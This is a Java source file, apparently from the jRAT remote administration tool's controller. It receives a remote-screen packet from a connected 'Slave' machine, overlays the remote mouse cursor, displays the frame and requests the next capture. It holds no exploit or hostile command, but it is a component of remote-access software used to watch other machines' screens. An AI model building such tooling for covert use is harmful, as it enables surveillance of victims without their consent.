package io.jrat.client.packets.incoming;

import io.jrat.client.Cursor;
import io.jrat.client.Slave;
import io.jrat.client.packets.outgoing.Packet12RemoteScreen;
import io.jrat.client.ui.frames.FrameRemoteScreen;

import java.awt.Graphics2D;
import java.awt.image.BufferedImage;
import java.io.DataInputStream;

public class Packet68RemoteScreenComplete extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int mouseX = slave.readInt();
		int mouseY = slave.readInt();
		
		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
		
		if (frame != null) {
			BufferedImage buffer = frame.getBuffer();
			if (buffer != null) {
				BufferedImage image = new BufferedImage(buffer.getWidth(), buffer.getHeight(), BufferedImage.TYPE_INT_RGB);
				
				Graphics2D imageGraphics = (Graphics2D) image.getGraphics();
				
				imageGraphics.drawImage(buffer, 0, 0, buffer.getWidth(), buffer.getHeight(), null);
				Cursor.drawCursor(slave.getOS(), imageGraphics, mouseX, mouseY);
				
				frame.drawOverlay(image);
			}
            if (frame.isRunning()) {
                slave.addToSendQueue(new Packet12RemoteScreen(frame.getImageSize(), frame.getQuality(), frame.getMonitor(), frame.getColumns(), frame.getRows()));
            }
		}
	}

}
